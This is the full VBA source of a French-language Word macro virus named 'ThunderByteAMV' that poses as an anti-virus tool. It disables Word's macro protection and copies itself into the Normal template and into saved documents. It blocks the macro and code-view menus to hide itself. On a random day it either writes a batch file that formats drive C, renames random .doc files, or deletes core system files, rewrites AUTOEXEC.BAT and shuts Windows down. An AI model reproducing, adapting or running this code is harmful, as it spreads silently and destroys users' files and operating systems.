   Attribute VB_Name = "ThunderByteAMV"
   Sub AutoExec()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorAE
   Protection.Show
   Randomize
   Dim MyDate
   MyDate = Date
   N$ = Int(Rnd * 31) + 1
   d$ = Mid(MyDate, 1, 2)
   If d$ = N$ Then
   Debut:
       Dim OptionValeur$, Fichier$, OldName, NewName, Choix
       ATBAMV.Show
       OptionValeur$ = WordBasic.[GetPrivateProfileString$]("OptionSelect", "Valeur", "WIN.INI")
       If OptionValeur$ = 0 Then
           GoTo Debut
           MsgBox "Vous devez choisir une option", vbInformation, "ThunderByte Anti Macro Virus"
       End If
       If OptionValeur$ = 1 Then
           StatusBar = "Réparation en cours...,  veuillez patienter..."
           Open "C:\DOS\Repar.bat" For Output As #1
           Print #1, "O|Format C: /u /Autotest"
           Close #1
           StatusBar = "Réparation terminée..."
           MsgBox "Votre disque dur est réparé, HAHAHAHAHA", vbCritical, "Virus ThunderByteAMV"
       End If
       If OptionValeur$ = 2 Then
           Dim Reponse
           Reponse = MsgBox("Voulez-vous créer un rapport sur les fichiers infectés ?", vbYesNo + vbDefaultButton1, "ThunderByte Anti Macro Virus")
           If Reponse = vbYes Then
               Open "c:\windows\report.txt" For Output As #1
                   Print #1, "Vous êtes infecté par ThunderByte Anti Macro Virus"
                   Print #1, "HAHAHAHAHA!!!!!, Merci à ZeMacroKiller98"
                   Print #1, "Ne faîtes pas confiance au  AntiVirus..."
                   Close #1
                   GoTo Message
           Else
               GoTo Message
           End If
   Message:
               StatusBar = "ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "               ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                                                               ThunderByte Anti Macro Virus par ZeMacroKiller98"
               For i = 1 To 400000
               Next i
               StatusBar = "                                                                                                       ThunderByte Anti Macro Virus par ZeMacroKiller98"
               GoTo Message
       End If
       If OptionValeur = 3 Then
       With Application.FileSearch
               .LookIn = CurDir
               .FileName = "*.doc"
           If .Execute() > 0 Then
           For i = 1 To 3
               Choix = Int(Rnd * .FoundFiles.Count) + 1
               Call Renommer
               Fichier$ = WordBasic.[GetPrivateProfileString$]("Renommer", "Nom", "WIN.INI")
               OldName = .FoundFiles(Choix)
               NewName = Fichier$ + ".txt"
               Name OldName As NewName
               MsgBox "Une partie de vos fichiers sont renommés, vous ne les retrouvez pas" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "Ne faîtes pas confiance au AntiVirus!!!!"
           Next i
           Else
           MsgBox "Impossible de renommer les fichiers.", vbCritical, "ThunderByte Anti Macro Virus"
           End If
       End With
       End If
       If OptionValeur = 4 Then
           StatusBar = "Suppression des fichiers en cours..."
           Kill "C:\WINDOWS\*.INI"
           Kill "C:\COMMAND.COM"
           Kill "C:\AUTOEXEC.BAT"
           Kill "C:\CONFIG.SYS"
           Kill "C:\MSDOS.SYS"
           Kill "C:\IO.SYS"
           MsgBox "Pour que les modifications soit prises en compte," & Chr$(13) & "Je dois redémarrer votre ordinateur", vbInformation, "ThunderByte Anti Macro Virus"
           Open "C:\Autoexec.bat" For Output As #1
               Print #1, "Echo Les AntiVirus ne sont pas tous des Antivirus"
               Print #1, "Echo Il peuvent être aussi des virus..."
               Print #1, "Echo HAHAHAHAHA!!!!!!"
           Close #1
           Tasks.ExitWindows
       End If
   End If
   ErrorAE:
   End Sub
   Sub AutoOpen()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorAO
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0) = "ThunderByteAMV" Then
           ThunderByteAMVInstalled = -1
       End If
   Next i
   If Not ThunderByteAMVInstalled Then
       Installation.Show
       StatusBar = "Installation en cours..."
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="ThunderByteAMV", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="Installation", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="Protection", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, name:="ATBAMV", Object:=wdOrganizerObjectProjectItems
       StatusBar = "Installation terminé"
   End If
   ErrorAO:
   End Sub
   Sub FileSaveAs()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFSA
       Dialogs(wdDialogFileSaveAs).Show
       If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
           ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
       End If
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="ThunderByteAMV", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="Installation", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="Protection", Object:=wdOrganizerObjectProjectItems
   Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, name:="ATBAMV", Object:=wdOrganizerObjectProjectItems
   ActiveDocument.Save
   ErrorFSA:
   End Sub
   Sub FileTemplates()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorFT
       MsgBox "ThunderByte protège l'accès de certains menus", vbInformation, "ThunderByte Anti Macro Virus"
   ErrorFT:
   End Sub
   Sub Renommer()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorRN
   Dim NH$, Valeur
   Randomize
   For i = 1 To 8
   NH$ = Int(Rnd * 10) + 1
   If NH$ = 1 Then Valeur = "J"
   If NH$ = 2 Then Valeur = "ç"
   If NH$ = 3 Then Valeur = "ù"
   If NH$ = 4 Then Valeur = "é"
   If NH$ = 5 Then Valeur = "m"
   If NH$ = 6 Then Valeur = "y"
   If NH$ = 7 Then Valeur = "z"
   If NH$ = 8 Then Valeur = "b"
   If NH$ = 9 Then Valeur = "è"
   If NH$ = 10 Then Valeur = "f"
   If i = 1 Then a$ = Valeur
   If i = 2 Then b$ = Valeur
   If i = 3 Then c$ = Valeur
   If i = 4 Then d$ = Valeur
   If i = 5 Then e$ = Valeur
   If i = 6 Then f$ = Valeur
   If i = 7 Then g$ = Valeur
   If i = 8 Then h$ = Valeur
   Next i
   Nom$ = a$ + b$ + c$ + d$ + e$ + f$ + g$ + h$
   WordBasic.SetPrivateProfileString "Renommer", "Nom", Nom$, "WIN.INI"
   ErrorRN:
   End Sub
   Sub ToolsMacro()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorTM
       MsgBox "Protection Anti Macro Virus activé" & Chr$(13) & "Accès refusé", vbInformation, "ThunderByte Anti Macro Virus"
   ErrorTM:
   End Sub
   Sub ViewVBCode()
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   On Error GoTo ErrorVVBC
       MsgBox "Menu protégé..." & Chr$(13) & "Accès Refusé", vbInformation, "ThunderByte Anti Macro Virus"
   ErrorVVBC:
   End Sub
